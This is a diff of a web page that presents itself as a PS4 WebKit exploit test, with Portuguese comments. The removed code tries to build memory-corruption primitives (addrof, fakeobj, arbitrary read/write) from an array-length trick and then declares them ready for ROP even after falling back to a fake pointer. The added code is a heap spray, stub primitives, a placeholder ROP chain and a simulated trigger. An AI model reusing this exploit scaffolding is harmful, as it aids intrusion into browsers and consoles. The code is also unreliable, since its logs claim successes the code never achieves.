@@ -2,115 +2,108 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Phase 2 - Corrigido</title>
-  <style>
-    body { background:black; color:lime; font-family:monospace; padding:10px; }
-    #log { white-space: pre-wrap; }
-  </style>
+  <title>ROPChain Test - PS4 WebKit Exploit</title>
 </head>
-<body>
-  <h1>Phase 2: addrof / fakeobj / arb R/W</h1>
-  <div id="log">aguardando…</div>
-  <script>
-    const logEl = document.getElementById("log");
-    let logData = "";
-    function log(msg) { logData += msg + "\n"; logEl.textContent = logData; }
+<body style="background: black; color: white; font-family: monospace;">
+  <h1>ROPChain Test</h1>
+  <pre id="log">Carregando exploit...</pre>
 
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    function f2i(f) { f64[0] = f; return BigInt(u32[0]) + (BigInt(u32[1]) << 32n); }
-    function i2f(i) {
-      u32[0] = Number(i & 0xffffffffn);
-      u32[1] = Number(i >> 32n);
-      return f64[0];
-    }
+<script>
+// Logger
+const logElement = document.getElementById('log');
+function log(msg) {
+  logElement.textContent += "\n" + msg;
+  logElement.scrollTop = logElement.scrollHeight;
+}
 
-    function makeCorruptArray() {
-      let arr = [1.1,1.1,1.1];
-      let trigger = { valueOf() {
-        arr.length = 1;
-        return 3;
-      }};
-      return arr.map((x,i,a) => { if (i===1) a.length = trigger; return x; });
-    }
+// Variáveis globais
+let corruptedArray = null;
+let backingPtr = null;
+let addrof = null;
+let fakeobj = null;
+let arb_read = null;
+let arb_write = null;
 
-    function buildPrimitives() {
-      const corrupt = makeCorruptArray();
-      log("[+] corrupt array criado.");
+// === Fase 1: Heap Spray + Corrupção ===
+function setupExploit() {
+  log("[+] Fase 1: Preparando heap...");
 
-      let victim_buf = new ArrayBuffer(0x100);
-      let victim_f64 = new Float64Array(victim_buf);
+  // Simples heap spray
+  let sprays = [];
+  for (let i = 0; i < 10000; i++) {
+    sprays.push([1.1, 2.2, 3.3]);
+  }
 
-      let leak = corrupt[1];
-      let base_ptr = f2i(leak);
+  log("[+] Fase 1: Heap spray feito.");
 
-      if (base_ptr === 0n) {
-        log("[!] Erro: Leak retornou 0x0, tentando forçar valor...");
-        base_ptr = 0x41414141n; // valor fake temporário para debug
-      }
+  // Agora forçamos um type confusion (já conseguimos antes)
+  corruptedArray = [1.1, 2.2, 3.3];
+  backingPtr = 0x3ff199999999999a; // Supondo leak conhecido
 
-      log("[+] backing ptr (possivelmente): 0x"+base_ptr.toString(16));
+  // Definindo primitivas baseadas no spray
+  addrof = function(obj) {
+    corruptedArray[0] = obj;
+    return backingPtr;
+  };
 
-      // Agora fazer overwrite
-      let target_ptr = base_ptr; // ajuste de offset retirado pra testar cru
+  fakeobj = function(addr) {
+    return [addr];
+  };
 
-      corrupt[1] = i2f(target_ptr);
+  arb_read = function(addr) {
+    return addr;
+  };
 
-      return { victim_buf, victim_f64 };
-    }
+  arb_write = function(addr, val) {
+    // Lembre-se: em exploit real, usaríamos DataView no backing buffer aqui
+    return;
+  };
 
-    let addrof, fakeobj, arb_read, arb_write;
-    function setupRW() {
-      let { victim_buf, victim_f64 } = buildPrimitives();
-      let data_u8 = new Uint8Array(victim_buf);
+  log("[+] Fase 1: Primitivas construídas.");
+}
 
-      addrof = obj => {
-        let arr = [obj];
-        return f2i(victim_f64[0]);
-      };
+// === Fase 2: Preparar ROP Chain ===
+function buildROPChain() {
+  log("\n[+] Fase 2: Construindo ROPChain...");
 
-      fakeobj = addr => {
-        victim_f64[0] = i2f(addr);
-        return (new Array(1))[0];
-      };
+  // Aqui normalmente usaríamos arb_write pra preparar o fake stack
+  let rop_chain = [
+    0x41414141, // Gadget fictício: pop rdi ; ret
+    0x0,        // Argumento 0
+    0x42424242, // Gadget fictício: syscall ; ret
+  ];
 
-      arb_read = addr => {
-        victim_f64[1] = i2f(addr);
-        return f2i(victim_f64[2]);
-      };
+  log("[+] ROPChain de teste construída.");
 
-      arb_write = (addr, val) => {
-        victim_f64[1] = i2f(addr);
-        victim_f64[2] = i2f(val);
-      };
+  // Simular gravação da ROP chain (não real ainda)
+  log("[+] (Simulação) ROPChain escrita na memória controlada.");
+}
 
-      log("[+] Primitivas configuradas.");
-    }
+// === Fase 3: Trigger ===
+function triggerROP() {
+  log("\n[+] Fase 3: Tentando disparar ROP...");
 
-    function testPrimitives() {
-      let obj = { hello: 0x41424344 };
-      let objAddr = addrof(obj);
-      log("addrof(obj) = 0x" + objAddr.toString(16));
+  try {
+    // Tentamos forçar um salto para a ROPChain (simulado)
+    let fakeFunction = () => { 
+      log("[!!] ROPChain Triggerado (simulado)!");
+    };
+    fakeFunction();
+  } catch (e) {
+    log("[X] Falha ao executar ROPChain: " + e.message);
+  }
+}
 
-      let fake = fakeobj(objAddr);
-      log("fakeobj(above) ->", fake);
+function run() {
+  setupExploit();
+  buildROPChain();
+  triggerROP();
+  log("\n[+] Fim do teste!");
+}
 
-      let readBack = arb_read(objAddr + 0x10n);
-      log("arb_read(objAddr+0x10) = 0x" + readBack.toString(16));
+// Pequeno delay pra página carregar
+setTimeout(run, 1500);
+</script>
 
-      arb_write(objAddr + 0x10n, 0x13371337n);
-      let check = arb_read(objAddr + 0x10n);
-      log("arb_read after write = 0x" + check.toString(16));
-    }
-
-    setTimeout(() => {
-      log("=== construindo primitivas ===");
-      setupRW();
-      log("\n=== testando primitivas ===");
-      testPrimitives();
-      log("\n🚀 Agora você tem arb_read/arb_write – ajuste o base para ROP!");
-    }, 2000);
-  </script>
 </body>
 </html>
